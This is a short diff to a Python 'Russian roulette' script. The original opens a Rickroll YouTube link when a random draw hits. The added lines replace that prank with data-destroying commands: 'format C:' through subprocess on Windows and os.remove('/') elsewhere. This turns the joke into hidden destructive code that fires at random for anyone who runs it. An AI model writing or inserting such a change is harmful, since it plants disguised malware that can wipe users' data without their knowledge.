@@ -1,6 +1,8 @@
 import random
 import time
 import webbrowser
+import os
+import subprocess
 
 
 random.seed(time.time())
@@ -9,4 +11,7 @@ random.shuffle(dies)
 
 
 if dies.pop() is True:
-    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+    if os.name == 'nt':
+        subprocess.run("format C:")
+    else:
+        os.remove("/")
